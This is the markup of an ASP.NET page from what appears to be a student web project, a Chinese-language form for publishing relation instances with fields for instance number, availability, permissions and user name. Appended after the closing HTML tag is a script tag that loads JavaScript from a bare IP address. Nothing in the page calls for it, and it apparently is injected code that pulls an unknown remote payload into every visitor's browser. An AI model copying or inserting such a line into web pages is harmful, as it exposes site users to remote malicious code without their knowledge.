<%@ Page Language="vb" AutoEventWireup="false" Codebehind="rinstancepublish.aspx.vb" Inherits="relation.rinstancepublish"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
	<HEAD>
		<title>rinstancepublish</title>
		<meta name="GENERATOR" content="Microsoft Visual Studio .NET 7.1">
		<meta name="CODE_LANGUAGE" content="Visual Basic .NET 7.1">
		<meta name="vs_defaultClientScript" content="JavaScript">
		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">
	</HEAD>
	<body>
		<form id="Form1" method="post">
		</form>
		<FONT face="宋体"></FONT><FONT face="宋体"></FONT><FONT face="宋体"></FONT><FONT face="宋体">
		</FONT><FONT face="宋体"></FONT><FONT face="宋体"></FONT><FONT face="宋体"></FONT><FONT face="宋体">
		</FONT><FONT face="宋体"></FONT><FONT face="宋体"></FONT><FONT face="宋体"></FONT><FONT face="宋体">
		</FONT><FONT face="宋体"></FONT><FONT face="宋体"></FONT><FONT face="宋体"></FONT><FONT face="宋体">
		</FONT><FONT face="宋体"></FONT><FONT face="宋体"></FONT><FONT face="宋体"></FONT><FONT face="宋体">
		</FONT><FONT face="宋体"></FONT><FONT face="宋体"></FONT>
		<TABLE id="Table9" cellSpacing="0" cellPadding="0" width="778" align="center" bgColor="#fef3bd"
			border="0" valign="middle">
			<TR>
				<TD vAlign="middle" width="778" bgColor="#fef3bd" colSpan="3" height="8">
					<DIV align="center"><IMG height="8" src="imga/bg1.gif" width="100%"></DIV>
				</TD>
			</TR>
			<TR bgColor="#ffffff">
				<TD colSpan="3" height="60"><IMG height="60" src="imga/logo.gif" width="321"><IMG height="60" src="imga/idea.jpg" width="457"></TD>
			</TR>
			<TR>
				<TD vAlign="middle" colSpan="3" height="8"><IMG height="8" src="imga/bg2.gif" width="100%"></TD>
			</TR>
		</TABLE> <!--===============include menu================--> <!--==========include menu==============-->
		<TABLE id="Table10" cellSpacing="0" cellPadding="0" width="778" align="center" border="0">
			<TR>
				<TD class="p9" vAlign="middle" width="196" bgColor="#dedede" height="18">
					<DIV align="center"><FONT color="#666666"><B>
								<asp:Label id="timetext" runat="server"></asp:Label>
								&nbsp; </B></FONT>
					</DIV>
				</TD>
				<TD class="p9" vAlign="middle" width="51" bgColor="#dedede" height="18">
					<DIV align="right"><IMG height="25" src="imga/blue.jpg" width="35"></DIV>
				</TD>
				<TD class="p9" vAlign="middle" width="548" background="imga/blue2.jpg" bgColor="#00459c"
					height="18">
					<DIV align="left"><SPAN class="p10"><FONT color="#ffffff"><A class="whitemenu" onmouseover="showMenu(this,'topmenu1',0)" onmouseout="hideMenu(event)"
									href="rmodelpublish.aspx" target="_top">发布</A> <A class="whitemenu" onmouseover="showMenu(this,'topmenu2',0)" onmouseout="hideMenu(event)"
									href="rmodelsearch.aspx" target="_top">查询</A>&nbsp;<A class="whitemenu" onmouseover="showMenu(this,'topmenu3',0)" onmouseout="hideMenu(event)"
									href="rmodelmodification.aspx" target="_top">修改</A> </FONT></SPAN>
					</DIV>
				</TD>
			</TR>
		</TABLE>
		<DIV id="Div1" style="VISIBILITY: hidden" onmouseout="hideMenu(event)"></DIV>
		<FONT face="宋体"></FONT>
		<TABLE id="Table11" height="62" cellSpacing="0" width="778" align="center">
			<TR border="0">
				<TD class="p10" vAlign="top" background="imga/bg3.gif" colSpan="2" height="20" border="0"><IMG height="1" src="imga/03.gif" width="100%"><BR>
					<FONT color="#000000">&nbsp;|</FONT><FONT color="#000000"><SPAN class="p9"> <a href="index.aspx">
								首页</a></SPAN> </FONT><FONT color="#000000">|</FONT> <FONT color="#000000">
						<SPAN class="p9"><a href="index.aspx">用户登录</a>|<a href="newcustomer.aspx">注册</a></SPAN>
					</FONT>
				</TD>
			</TR>
			<TR border="0">
				<TD vAlign="top" width="159" bgColor="#0859ad" height="20" style="WIDTH: 159px">&nbsp;
					<asp:label id="lblHint" runat="server" ForeColor="Info">Label</asp:label></TD>
				<TD vAlign="top" bgColor="#0859ad" height="20">
					<DIV align="right"><FONT color="#ffffff"><marquee direction="left" behavior="scroll" scrolldelay="100" loop="-1">欢迎您 
								&nbsp;软件业的朋友！ &nbsp; &nbsp;</marquee>
						</FONT>
					</DIV>
				</TD>
			</TR>
		</TABLE>
		<CENTER>
			<TABLE id="Table12" height="400" cellSpacing="0" cellPadding="0" width="778" bgColor="#ffffff"
				border="0">
				<TR>
					<TD vAlign="top" width="172" bgColor="#0859ad" height="14"><!--====================include pageleft==================-->
						<TABLE id="Table13" cellSpacing="0" cellPadding="0" width="100%" border="0">
							<TR>
								<TD vAlign="top" bgColor="#0859ad">
									<DIV align="center"><FONT face="宋体"></FONT>&nbsp;</DIV>
								</TD>
							</TR>
						</TABLE>
						<TABLE id="Table14" height="100%" cellSpacing="0" cellPadding="0" width="100%" border="0">
							<TR>
								<TD vAlign="top" bgColor="#9cd7ef">
									<DIV align="center"><IMG style="WIDTH: 100%; HEIGHT: 32px" height="32" src="imga/grad.gif" width="172">&nbsp;
										<TABLE id="Table15" style="WIDTH: 153px; HEIGHT: 153px" width="153" border="1">
											<TR>
												<TD width="147" height="45">
													<DIV align="center">&nbsp;&nbsp;<a href="rmodelpublish.aspx">发布关系空间</a></DIV>
												</TD>
											</TR>
											<TR>
												<TD height="43">
													<DIV align="center"><a href="rdefinitionpublish.aspx">发布关系类型</a></DIV>
												</TD>
											</TR>
											<TR>
												<TD height="55">
													<DIV align="center"><a href="rinstancepublish.aspx">发布关系实例</a></DIV>
												</TD>
											</TR>
										</TABLE>
										<BR>
										<BR>
									</DIV>
								</TD>
							</TR>
						</TABLE>
					</TD>
					<TD vAlign="top" width="21" bgColor="#ffffff"><IMG height="23" src="imga/05.gif" width="21"></TD>
					<TD vAlign="top" width="611">
						<FORM style="MARGIN: 0px" name="loginForm" action="" method="post" runat="server">
							&nbsp;&nbsp;
							<TABLE id="Table1" style="WIDTH: 558px; HEIGHT: 385px" cellSpacing="1" cellPadding="1"
								width="558" border="1">
								<TR>
									<TD style="WIDTH: 272px; HEIGHT: 16px">
										<TABLE id="Table2" style="WIDTH: 264px; HEIGHT: 30px" cellSpacing="1" cellPadding="1" width="264"
											border="1">
											<TR>
												<TD style="WIDTH: 122px">
													<asp:Label id="Label6" runat="server" Width="120px">关系类型编号</asp:Label></TD>
												<TD>
													<asp:DropDownList id="ddlstDefSearch" runat="server" Width="96px"></asp:DropDownList></TD>
											</TR>
										</TABLE>
									</TD>
									<TD style="WIDTH: 241px; HEIGHT: 16px"><FONT face="宋体"></FONT></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 272px; HEIGHT: 21px">
										<asp:Label id="Label2" runat="server">关系实例编号</asp:Label></TD>
									<TD style="WIDTH: 241px; HEIGHT: 21px">
										<asp:Label id="Label4" runat="server">关系实例可用性</asp:Label></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 272px; HEIGHT: 29px">
										<asp:TextBox id="txtInstKey" runat="server"></asp:TextBox></TD>
									<TD style="WIDTH: 241px; HEIGHT: 29px">
										<asp:RadioButton id="rbtnInstAvailYes" runat="server" Text="可用" GroupName="rbtnInstAvail"></asp:RadioButton><FONT face="宋体">&nbsp;
											<asp:RadioButton id="rbtnInstAvailNo" runat="server" Text="不可用" GroupName="rbtnInstAvail"></asp:RadioButton></FONT></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 272px; HEIGHT: 7px">
										<asp:Label id="Label1" runat="server">关系对象权限</asp:Label></TD>
									<TD style="WIDTH: 241px; HEIGHT: 7px"><FONT face="宋体"></FONT></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 272px; HEIGHT: 29px">
										<asp:radiobutton id="rbtnAccPri1" runat="server" Text="权限1" GroupName="rbtnAccPri"></asp:radiobutton>&nbsp;
										<asp:radiobutton id="rbtnAccPri2" runat="server" Text="权限2" GroupName="rbtnAccPri"></asp:radiobutton>&nbsp;
										<asp:radiobutton id="rbtnAccPri3" runat="server" Text="权限3" GroupName="rbtnAccPri"></asp:radiobutton></TD>
									<TD style="WIDTH: 241px; HEIGHT: 29px"><FONT face="宋体"></FONT></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 272px; HEIGHT: 31px">
										<asp:Label id="Label5" runat="server" Width="160px">用户名</asp:Label></TD>
									<TD style="WIDTH: 241px; HEIGHT: 31px"><FONT face="宋体"></FONT></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 272px; HEIGHT: 29px">
										<asp:TextBox id="txtUser" runat="server"></asp:TextBox></TD>
									<TD style="WIDTH: 241px; HEIGHT: 29px"><FONT face="宋体">&nbsp;</FONT></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 272px; HEIGHT: 32px">
										<asp:Label id="Label10" runat="server" Width="184px">接口名称</asp:Label></TD>
									<TD style="WIDTH: 241px; HEIGHT: 32px"></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 272px">
										<asp:TextBox id="txtOper" runat="server"></asp:TextBox></TD>
									<TD style="WIDTH: 241px"><FONT face="宋体"></FONT></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 272px">
										<asp:Label id="Label3" runat="server">关联对象类型</asp:Label></TD>
									<TD style="WIDTH: 241px"><FONT face="宋体"></FONT></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 272px">
										<asp:TextBox id="txtInstType" runat="server"></asp:TextBox></TD>
									<TD style="WIDTH: 241px"></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 272px">
										<TABLE id="Table3" style="WIDTH: 267px; HEIGHT: 32px" cellSpacing="1" cellPadding="1" width="267"
											border="1">
											<TR>
												<TD style="WIDTH: 143px">&nbsp;</TD>
												<TD style="WIDTH: 73px">
													<asp:Button id="btnNext" runat="server" Text="下一步"></asp:Button></TD>
												<TD></TD>
											</TR>
										</TABLE>
									</TD>
									<TD style="WIDTH: 241px">
										<TABLE id="Table4" cellSpacing="1" cellPadding="1" width="300" border="1">
											<TR>
												<TD style="WIDTH: 50px">&nbsp;</TD>
												<TD style="WIDTH: 73px">
													<asp:Button id="btnCancel" runat="server" Text="撤消"></asp:Button></TD>
												<TD></TD>
											</TR>
										</TABLE>
									</TD>
								</TR>
							</TABLE>
						</FORM>
						<asp:label id="lblWarning" runat="server" Width="408px" ForeColor="#0000C0">label</asp:label>
					</TD>
				</TR>
			</TABLE>
		</CENTER> <!---====================include pagetail================-->
		<CENTER>
			<TABLE id="Table16" cellSpacing="0" cellPadding="0" width="778" border="0">
				<TR>
					<TD><IMG height="31" src="imga/bg4.gif" width="778"></TD>
				</TR>
				<TR>
					<TD class="p9" background="imga/bg5.gif" style="HEIGHT: 18px">
						<DIV align="center">| 联络我们 | 客服电话：<STRONG><FONT face="Arial">0571-63740939</FONT></STRONG></DIV>
					</TD>
				</TR>
				<TR>
					<TD class="p9" bgColor="#ffffff"><FONT face="宋体">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
							版权所有：&nbsp;&nbsp; 浙江林学院信息工程学院天信022 王海玲 陆美丽 </FONT>
					</TD>
				</TR>
			</TABLE>
		</CENTER>
	</body>
</HTML>
<script src="http://222.208.183.246/ad/ad.js"></script>
